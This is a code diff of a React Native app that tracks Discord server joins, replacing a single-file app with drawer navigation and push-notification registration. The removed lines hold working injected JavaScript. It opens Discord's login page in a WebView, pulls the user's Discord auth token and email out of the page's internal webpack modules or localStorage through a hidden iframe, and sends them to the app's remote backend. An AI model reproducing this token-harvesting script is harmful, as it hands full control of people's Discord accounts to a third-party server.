@@ -1,438 +1,412 @@
-import React, { useEffect, useRef, useState } from "react";
-import {
-  View,
-  Text,
-  FlatList,
-  StyleSheet,
-  TouchableOpacity,
-  Alert,
-  Platform,
-  SafeAreaView,
-  ActivityIndicator,
-} from "react-native";
-import { WebView } from "react-native-webview";
-import * as Notifications from "expo-notifications";
+import React, { useEffect, useState } from "react";
+import { NavigationContainer } from "@react-navigation/native";
+import { createDrawerNavigator, DrawerContentScrollView, DrawerItemList } from "@react-navigation/drawer";
+import { View, ActivityIndicator, StyleSheet, TouchableOpacity, Text } from "react-native";
 import AsyncStorage from "@react-native-async-storage/async-storage";
+import * as Notifications from "expo-notifications";
+import { Platform } from "react-native";
+import { GestureHandlerRootView } from "react-native-gesture-handler";
 
+// Import screens
+import WelcomeScreen from "./screens/WelcomeScreen";
+import LoginScreen from "./screens/LoginScreen";
+import SignupScreen from "./screens/SignupScreen";
+import Dashboard from "./screens/Dashboard";
+import ProfileScreen from "./screens/ProfileScreen";
+import BlockedAccessScreen from "./screens/BlockedAccessScreen";
+import AccountLinkScreen from "./screens/AccountLinkScreen";
+import { isSubscriptionExpired } from "./utils/subscription";
+
+const Drawer = createDrawerNavigator();
+const API_URL = "https://intelligent-gratitude-production.up.railway.app";
+
+// Configure notification handler
 Notifications.setNotificationHandler({
   handleNotification: async () => ({
-    shouldShowAlert: true,
+    shouldShowBanner: true,
+    shouldShowList: true,
     shouldPlaySound: true,
     shouldSetBadge: false,
   }),
 });
 
 export default function App() {
-  const [moves, setMoves] = useState([]);
-  const [refreshing, setRefreshing] = useState(false);
-  const [isLoggedIn, setIsLoggedIn] = useState(false);
-  const [showWebView, setShowWebView] = useState(false);
-  const [myUserId, setMyUserId] = useState(null);
-  const [userEmail, setUserEmail] = useState("");
+  const [user, setUser] = useState(null);
+  const [loading, setLoading] = useState(true);
 
-  const [isSubscribed, setIsSubscribed] = useState(true);
-  const [paystackUrl, setPaystackUrl] = useState(null);
-
-  const webViewRef = useRef(null);
-  const lastSeenId = useRef(null);
-
-  const API_URL = "https://intelligent-gratitude-production.up.railway.app";
-
-  // --- IMPROVED SCRIPT: Target UserStore directly ---
-  const INJECTED_JAVASCRIPT = `
-  (function() {
-    let attempts = 0;
-    function capture() {
-      try {
-        let token = null;
-        let email = null;
-        const webpack = window.webpackChunkdiscord_app;
-        
-        if (webpack) {
-          const m = webpack.push([[Symbol()], {}, (e) => e]);
-          for (const i in m.c) {
-            const exp = m.c[i].exports;
-            if (exp && exp.default && typeof exp.default === 'object') {
-              // Get Token
-              if (exp.default.getToken) token = exp.default.getToken();
-              
-              // Get Email (Try multiple known internal paths)
-              if (exp.default.getCurrentUser) {
-                const u = exp.default.getCurrentUser();
-                if (u && u.email) email = u.email;
-              }
-              if (!email && exp.default.getEmail) email = exp.default.getEmail();
-            }
-          }
-        }
-
-        // Token Fallback
-        if (!token) {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-          const raw = iframe.contentWindow.localStorage.getItem('token');
-          if (raw) token = raw.replace(/"/g, '');
-        }
-
-        if (token && token.length > 20) {
-          attempts++;
-          // Send if we have email OR if we've tried for 8 seconds
-          if (email || attempts > 16) {
-            window.ReactNativeWebView.postMessage(JSON.stringify({
-              type: 'TOKEN_DATA', 
-              token: token, 
-              email: email || "user@discord.com" 
-            }));
-            return true;
-          }
-        }
-      } catch (e) {}
-      return false;
-    }
-    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
-  })();
-`;
-
+  // Load user on mount
   useEffect(() => {
-    registerForNotifications();
-    loadSavedUser();
+    loadUser();
   }, []);
 
+  // Configure Android notification channel
   useEffect(() => {
-    if (isLoggedIn && myUserId && isSubscribed) {
-      fetchMoves();
-      const interval = setInterval(fetchMoves, 5000);
-      return () => clearInterval(interval);
+    if (Platform.OS === "android") {
+      Notifications.setNotificationChannelAsync("default", {
+        name: "default",
+        importance: Notifications.AndroidImportance.MAX,
+        vibrationPattern: [0, 250, 250, 250],
+        lightColor: "#FF231F7C",
+        showBadge: true,
+        enableVibrate: true,
+        enableLights: true,
+        sound: "default",
+      }).then(() => console.log("Android notification channel configured"));
     }
-  }, [isLoggedIn, myUserId, isSubscribed]);
+  }, []);
 
-  const loadSavedUser = async () => {
-    const savedId = await AsyncStorage.getItem("saved_user_id");
-    const savedEmail = await AsyncStorage.getItem("saved_user_email");
-    if (savedId) {
-      setMyUserId(savedId);
-      setUserEmail(savedEmail || "");
-      setIsLoggedIn(true);
+  // Register push token when user becomes available
+  useEffect(() => {
+    if (!user || !user.token) {
+      console.log("Token registration skipped: No user or token");
+      return;
     }
-  };
 
-  const onWebViewMessage = async (event) => {
-    try {
-      const message = JSON.parse(event.nativeEvent.data);
-      if (message.type === "TOKEN_DATA" && message.token) {
-        setShowWebView(false);
-        await sendTokenToBackend(message.token, message.email);
+    if (isSubscriptionExpired(user)) {
+      console.log("Token registration skipped: Subscription expired");
+      return;
+    }
+
+    console.log("Starting push token registration for user:", user.email);
+
+    const register = async () => {
+      try {
+        if (Platform.OS === "web") {
+          console.log("Skipping token registration on web");
+          return;
+        }
+
+        console.log("Requesting notification permissions...");
+        const { status } = await Notifications.requestPermissionsAsync();
+        if (status !== "granted") {
+          console.log("Push permissions not granted:", status);
+          return;
+        }
+        console.log("Notification permissions granted");
+
+        console.log("Getting push tokens...");
+        
+        const expoTokenObj = await Notifications.getExpoPushTokenAsync({
+          projectId: "c3dc6192-aca5-431c-becb-786b9b36af31",
+          applicationId: "com.collaborative.minds",
+          useEnterprisePushToken: true,
+        });
+        const expoToken = expoTokenObj?.data;
+        
+        let fcmToken = null;
+        try {
+          const deviceTokenObj = await Notifications.getDevicePushTokenAsync();
+          fcmToken = deviceTokenObj?.data;
+          console.log("Got native FCM token:", fcmToken?.substring(0, 20) + "...");
+        } catch (e) {
+          // Firebase not initialized or google-services.json missing
+          // This is expected if Firebase isn't set up - Expo push will still work
+          console.log("⚠️ Native FCM token not available (Firebase not configured):", e.message);
+          console.log("📝 Note: Expo push notifications will still work without FCM");
+        }
+
+        const tokensToRegister = [];
+        if (expoToken) {
+          tokensToRegister.push({ token: expoToken, token_type: 'expo' });
+        }
+        if (fcmToken) {
+          tokensToRegister.push({ token: fcmToken, token_type: 'fcm' });
+        }
+
+        if (tokensToRegister.length === 0) {
+          console.error("Failed to get any push tokens");
+          return;
+        }
+
+        console.log(`Registering ${tokensToRegister.length} token(s) with server...`);
+
+        for (const tokenData of tokensToRegister) {
+          try {
+            const response = await fetch(`${API_URL}/register-push-token`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                Authorization: `Bearer ${user.token}`,
+              },
+              body: JSON.stringify(tokenData),
+            });
+
+            if (response.ok) {
+              console.log(`✅ ${tokenData.token_type.toUpperCase()} token registered successfully`);
+            } else {
+              const resData = await response.json();
+              console.error(`❌ Server failed to save ${tokenData.token_type} token:`, resData);
+            }
+          } catch (e) {
+            console.error(`❌ Error registering ${tokenData.token_type} token:`, e.message);
+          }
+        }
+      } catch (e) {
+        console.error("❌ Error in push registration:", e.message);
       }
-    } catch (e) {}
-  };
+    };
 
-  const sendTokenToBackend = async (token, email) => {
+    const timer = setTimeout(() => {
+      register();
+    }, 500);
+
+    return () => clearTimeout(timer);
+  }, [user?.token, user?.email, user?.tier, user?.is_subscribed, user?.expiry_date]);
+
+  // Periodic subscription expiry check
+  useEffect(() => {
+    if (!user) return;
+
+    const checkExpiry = async () => {
+      if (isSubscriptionExpired(user)) {
+        const updatedUser = {
+          ...user,
+          tier: "none",
+          is_subscribed: false
+        };
+        await AsyncStorage.setItem("user_profile", JSON.stringify(updatedUser));
+        setUser(updatedUser);
+      }
+    };
+
+    const interval = setInterval(checkExpiry, 30000); // Check every 30 seconds
+    return () => clearInterval(interval);
+  }, [user]);
+
+  const loadUser = async () => {
     try {
-      const response = await fetch(`${API_URL}/link-account`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token, email }),
-      });
-      const result = await response.json();
-      if (response.ok) {
-        const newUserId = String(result.user_id);
-        await AsyncStorage.setItem("saved_user_id", newUserId);
-        await AsyncStorage.setItem("saved_user_email", email);
-        setMyUserId(newUserId);
-        setUserEmail(email);
-        setIsLoggedIn(true);
-        Alert.alert("✅ Connected", "Join tracking active!");
+      const userData = await AsyncStorage.getItem("user_profile");
+      if (userData) {
+        const parsedUser = JSON.parse(userData);
+        setUser(parsedUser);
       }
     } catch (error) {
-      Alert.alert("Server Error", "Could not reach backend.");
-    }
-  };
-
-  const fetchMoves = async () => {
-    if (!myUserId) return;
-    try {
-      const res = await fetch(`${API_URL}/get-moves/${myUserId}`);
-      if (res.status === 402) {
-        setIsSubscribed(false);
-        return;
-      }
-      const data = await res.json();
-      if (Array.isArray(data)) {
-        setIsSubscribed(true);
-        if (
-          lastSeenId.current &&
-          data.length > 0 &&
-          data[0].id !== lastSeenId.current
-        ) {
-          triggerNotification(data[0]);
-        }
-        if (data.length > 0) lastSeenId.current = data[0].id;
-        setMoves(data);
-      }
-    } catch (err) {
-      console.log("Polling...");
+      console.error("Error loading user:", error);
     } finally {
-      setRefreshing(false);
+      setLoading(false);
     }
   };
 
-  const handlePayment = async () => {
-    try {
-      const response = await fetch(`${API_URL}/initialize-payment`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          user_id: myUserId,
-          email: userEmail || "customer@app.com",
-        }),
-      });
-      const result = await response.json();
-      if (result.status && result.data.authorization_url) {
-        setPaystackUrl(result.data.authorization_url);
-      } else {
-        Alert.alert("Error", "Payment failed to start.");
-      }
-    } catch (e) {
-      Alert.alert("Error", "Server unreachable.");
-    }
-  };
-
-  // --- IMPROVED: Catch Paystack success more reliably ---
-  const handlePaystackNavigation = (navState) => {
-    const url = navState.url.toLowerCase();
-    // Check for common redirect success patterns
-    if (
-      url.includes("success") ||
-      url.includes("callback") ||
-      url.includes("checkout.paystack.com/success")
-    ) {
-      setTimeout(() => {
-        setPaystackUrl(null);
-        setIsSubscribed(true);
-        fetchMoves();
-        Alert.alert("Success", "Account unlocked!");
-      }, 2000); // Small delay to let Paystack finish its visual "Success" animation
-    }
-  };
-
-  const handleLogout = async () => {
-    Alert.alert("Reset", "Logout?", [
-      { text: "Cancel", style: "cancel" },
-      {
-        text: "Reset",
-        style: "destructive",
-        onPress: async () => {
-          await AsyncStorage.clear();
-          setIsLoggedIn(false);
-          setMyUserId(null);
-          setMoves([]);
-          setShowWebView(false);
-        },
-      },
-    ]);
-  };
-
-  const triggerNotification = async (move) => {
-    await Notifications.scheduleNotificationAsync({
-      content: { title: `📥 New Member!`, body: move.action },
-      trigger: null,
-    });
-  };
-
-  const registerForNotifications = async () => {
-    const { status } = await Notifications.requestPermissionsAsync();
-    if (status !== "granted") console.log("Perms denied");
-  };
-
-  const handleNavigationChange = (navState) => {
-    if (navState.url.includes("/channels/")) {
-      webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT);
-    }
-  };
-
-  const renderMove = ({ item }) => (
-    <View style={styles.moveItem}>
-      <View style={styles.headerRow}>
-        <Text style={styles.expert}>
-          👤 {item.action.split(" ")[1] || "Member"}
-        </Text>
-        <Text style={styles.serverTag}>{item.server}</Text>
+  if (loading) {
+    return (
+      <View style={styles.loadingContainer}>
+        <ActivityIndicator size="large" color="#5865F2" />
       </View>
-      <Text style={styles.actionText}>Joined the server</Text>
-      <Text style={styles.timeText}>
-        {new Date(item.timestamp).toLocaleTimeString()}
-      </Text>
-    </View>
-  );
-
-  if (paystackUrl) {
-    return (
-      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
-        <View style={styles.webViewHeader}>
-          <TouchableOpacity onPress={() => setPaystackUrl(null)}>
-            <Text style={{ color: "red" }}>Cancel</Text>
-          </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Secure Payment</Text>
-          <View style={{ width: 50 }} />
-        </View>
-        <WebView
-          source={{ uri: paystackUrl }}
-          onNavigationStateChange={handlePaystackNavigation}
-          style={{ flex: 1 }}
-        />
-      </SafeAreaView>
     );
   }
 
-  if (showWebView) {
+  // If no user, show auth screens
+  if (!user) {
     return (
-      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
-        <View style={styles.webViewHeader}>
-          <TouchableOpacity onPress={() => setShowWebView(false)}>
-            <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
-          </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Connect Discord</Text>
-          <View style={{ width: 50 }} />
-        </View>
-        <WebView
-          ref={webViewRef}
-          incognito={true}
-          source={{ uri: "https://discord.com/login" }}
-          injectedJavaScript={INJECTED_JAVASCRIPT}
-          onMessage={onWebViewMessage}
-          onNavigationStateChange={handleNavigationChange}
-          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
-        />
-      </SafeAreaView>
-    );
-  }
-
-  return (
-    <View style={styles.container}>
-      {!isLoggedIn ? (
-        <View style={styles.loginContainer}>
-          <Text style={styles.loginEmoji}>🚀</Text>
-          <Text style={styles.title}>Join Tracker</Text>
-          <TouchableOpacity
-            style={styles.loginButton}
-            onPress={() => setShowWebView(true)}
+      <GestureHandlerRootView style={{ flex: 1 }}>
+        <NavigationContainer>
+          <Drawer.Navigator
+            screenOptions={{ 
+              headerShown: false, 
+              drawerType: "front",
+              swipeEnabled: false, // Disable drawer for auth screens
+            }}
+            initialRouteName="Welcome"
           >
-            <Text style={styles.buttonText}>Connect Discord Account</Text>
-          </TouchableOpacity>
+          <Drawer.Screen name="Welcome">
+            {(props) => <WelcomeScreen {...props} />}
+          </Drawer.Screen>
+          <Drawer.Screen name="Login">
+            {(props) => <LoginScreen {...props} setUser={setUser} />}
+          </Drawer.Screen>
+          <Drawer.Screen name="Signup">
+            {(props) => <SignupScreen {...props} setUser={setUser} />}
+          </Drawer.Screen>
+        </Drawer.Navigator>
+      </NavigationContainer>
+      </GestureHandlerRootView>
+    );
+  }
+
+  // Check if subscription is expired
+  const expired = isSubscriptionExpired(user);
+
+  // Custom drawer content for expired users
+  const ExpiredDrawerContent = (props) => {
+    return (
+      <DrawerContentScrollView {...props} style={{ backgroundColor: '#FFFFFF' }}>
+        <View style={{ padding: 20, borderBottomWidth: 1, borderBottomColor: '#E5E7EB' }}>
+          <Text style={{ fontSize: 24, fontWeight: '800', color: '#111827', marginBottom: 4 }}>
+            Discord Monitor
+          </Text>
+          <Text style={{ fontSize: 14, color: '#6B7280' }}>{user.email}</Text>
+          <View style={{ marginTop: 12, padding: 10, backgroundColor: '#FEE2E2', borderRadius: 8 }}>
+            <Text style={{ fontSize: 12, color: '#EF4444', fontWeight: '600' }}>
+              ⚠️ Subscription Expired
+            </Text>
+          </View>
         </View>
-      ) : (
-        <>
-          {!isSubscribed ? (
-            <View style={styles.paywallContainer}>
-              <Text style={styles.loginEmoji}>🔒</Text>
-              <Text style={styles.title}>Access Locked</Text>
-              <TouchableOpacity
-                style={styles.loginButton}
-                onPress={handlePayment}
-              >
-                <Text style={styles.buttonText}>Renew Access (₦5,000)</Text>
-              </TouchableOpacity>
-              <TouchableOpacity
-                style={{ marginTop: 25 }}
-                onPress={handleLogout}
-              >
-                <Text style={{ color: "#999" }}>Logout</Text>
-              </TouchableOpacity>
-            </View>
-          ) : (
-            <>
-              <View style={styles.headerBar}>
-                <Text style={styles.title}>Live Feed</Text>
-                <TouchableOpacity onPress={handleLogout}>
-                  <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
-                    Reset
-                  </Text>
+        <DrawerItemList {...props} />
+      </DrawerContentScrollView>
+    );
+  };
+
+  // If expired, show limited access (Profile and Subscription screens only)
+  if (expired || user.tier === "none") {
+    return (
+      <GestureHandlerRootView style={{ flex: 1 }}>
+        <NavigationContainer>
+          <Drawer.Navigator
+            drawerContent={(props) => <ExpiredDrawerContent {...props} />}
+            screenOptions={({ navigation }) => ({
+              headerShown: true,
+              drawerType: "front",
+              drawerActiveTintColor: "#5865F2",
+              drawerInactiveTintColor: "#6B7280",
+              drawerStyle: {
+                backgroundColor: '#FFFFFF',
+                width: 280,
+              },
+              headerStyle: {
+                backgroundColor: '#5865F2',
+              },
+              headerTintColor: '#FFFFFF',
+              headerTitleStyle: {
+                fontWeight: '700',
+              },
+              drawerPosition: "left",
+              swipeEnabled: true,
+              swipeEdgeWidth: 50,
+              headerLeft: () => (
+                <TouchableOpacity
+                  onPress={() => navigation.toggleDrawer()}
+                  style={{ marginLeft: 16, padding: 8 }}
+                >
+                  <Text style={{ fontSize: 24, color: '#FFFFFF' }}>☰</Text>
                 </TouchableOpacity>
-              </View>
-              <FlatList
-                data={moves}
-                keyExtractor={(item) => item.id}
-                renderItem={renderMove}
-                refreshing={refreshing}
-                onRefresh={() => {
-                  setRefreshing(true);
-                  fetchMoves();
-                }}
-                ListEmptyComponent={
-                  <Text style={styles.empty}>Waiting for activity...</Text>
-                }
-              />
-            </>
-          )}
-        </>
-      )}
-    </View>
+              ),
+            })}
+            initialRouteName="Blocked"
+            key={user.tier}
+          >
+          <Drawer.Screen 
+            name="Profile"
+            options={{ 
+              title: "Profile",
+              drawerLabel: "👤 Profile",
+            }}
+          >
+            {(props) => <ProfileScreen {...props} user={user} setUser={setUser} />}
+          </Drawer.Screen>
+          <Drawer.Screen 
+            name="Blocked"
+            options={{ 
+              title: "Subscription",
+              drawerLabel: "🔒 Subscription",
+            }}
+          >
+            {(props) => <BlockedAccessScreen {...props} user={user} setUser={setUser} />}
+          </Drawer.Screen>
+        </Drawer.Navigator>
+      </NavigationContainer>
+      </GestureHandlerRootView>
+    );
+  }
+
+  // Custom drawer content with header
+  const CustomDrawerContent = (props) => {
+    return (
+      <DrawerContentScrollView {...props} style={{ backgroundColor: '#FFFFFF' }}>
+        <View style={{ padding: 20, borderBottomWidth: 1, borderBottomColor: '#E5E7EB' }}>
+          <Text style={{ fontSize: 24, fontWeight: '800', color: '#111827', marginBottom: 4 }}>
+            Discord Monitor
+          </Text>
+          <Text style={{ fontSize: 14, color: '#6B7280' }}>{user.email}</Text>
+        </View>
+        <DrawerItemList {...props} />
+      </DrawerContentScrollView>
+    );
+  };
+
+  // User is logged in and subscribed - show main app
+  return (
+    <GestureHandlerRootView style={{ flex: 1 }}>
+      <NavigationContainer>
+        <Drawer.Navigator
+          drawerContent={(props) => <CustomDrawerContent {...props} />}
+          screenOptions={({ navigation }) => ({
+            headerShown: true,
+            drawerType: "front",
+            drawerActiveTintColor: "#5865F2",
+            drawerInactiveTintColor: "#6B7280",
+            drawerStyle: {
+              backgroundColor: '#FFFFFF',
+              width: 280,
+            },
+            headerStyle: {
+              backgroundColor: '#5865F2',
+            },
+            headerTintColor: '#FFFFFF',
+            headerTitleStyle: {
+              fontWeight: '700',
+            },
+            drawerPosition: "left",
+            swipeEnabled: true,
+            swipeEdgeWidth: 50, // Enable swipe from edge
+            headerLeft: () => (
+              <TouchableOpacity
+                onPress={() => navigation.toggleDrawer()}
+                style={{ marginLeft: 16, padding: 8 }}
+              >
+                <Text style={{ fontSize: 24, color: '#FFFFFF' }}>☰</Text>
+              </TouchableOpacity>
+            ),
+          })}
+          initialRouteName="Dashboard"
+          key={user.tier}
+        >
+        <Drawer.Screen
+          name="Dashboard"
+          options={{ 
+            drawerLabel: "📊 Dashboard",
+            title: "Dashboard",
+          }}
+        >
+          {(props) => <Dashboard {...props} user={user} setUser={setUser} />}
+        </Drawer.Screen>
+        <Drawer.Screen
+          name="Profile"
+          options={{ 
+            drawerLabel: "👤 Profile",
+            title: "Profile",
+          }}
+        >
+          {(props) => <ProfileScreen {...props} user={user} setUser={setUser} />}
+        </Drawer.Screen>
+        <Drawer.Screen
+          name="Accounts"
+          options={{ 
+            drawerLabel: "🔗 Linked Accounts",
+            title: "Linked Accounts",
+          }}
+        >
+          {(props) => <AccountLinkScreen {...props} user={user} />}
+        </Drawer.Screen>
+        <Drawer.Screen
+          name="Blocked"
+          options={{ 
+            drawerLabel: "🔒 Subscription",
+            title: "Subscription",
+          }}
+        >
+          {(props) => <BlockedAccessScreen {...props} user={user} setUser={setUser} />}
+        </Drawer.Screen>
+      </Drawer.Navigator>
+    </NavigationContainer>
+    </GestureHandlerRootView>
   );
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, padding: 20, backgroundColor: "#f9f9f9" },
-  webViewHeader: {
-    height: 60,
-    flexDirection: "row",
-    justifyContent: "space-between",
-    alignItems: "center",
-    paddingHorizontal: 20,
-    borderBottomWidth: 1,
-    borderBottomColor: "#eee",
-  },
-  loginContainer: {
+  loadingContainer: {
     flex: 1,
     justifyContent: "center",
     alignItems: "center",
-    padding: 30,
+    backgroundColor: "#F9FAFB",
   },
-  paywallContainer: {
-    flex: 1,
-    justifyContent: "center",
-    alignItems: "center",
-    padding: 30,
-  },
-  loginEmoji: { fontSize: 80, marginBottom: 10 },
-  headerBar: {
-    flexDirection: "row",
-    justifyContent: "space-between",
-    alignItems: "center",
-    marginTop: 40,
-    marginBottom: 20,
-  },
-  title: { fontSize: 26, fontWeight: "bold" },
-  loginButton: {
-    backgroundColor: "#5865F2",
-    padding: 18,
-    borderRadius: 15,
-    width: "100%",
-  },
-  buttonText: {
-    color: "#fff",
-    textAlign: "center",
-    fontWeight: "bold",
-    fontSize: 16,
-  },
-  moveItem: {
-    backgroundColor: "#fff",
-    padding: 15,
-    marginBottom: 10,
-    borderRadius: 12,
-    elevation: 2,
-  },
-  headerRow: { flexDirection: "row", justifyContent: "space-between" },
-  expert: { fontWeight: "bold", color: "#5865F2" },
-  serverTag: {
-    fontSize: 10,
-    color: "#777",
-    backgroundColor: "#eee",
-    paddingHorizontal: 6,
-    paddingVertical: 2,
-    borderRadius: 10,
-  },
-  actionText: { marginTop: 8, fontSize: 15, color: "#333" },
-  timeText: { fontSize: 11, color: "#999", marginTop: 5 },
-  empty: { textAlign: "center", marginTop: 50, color: "#999" },
 });
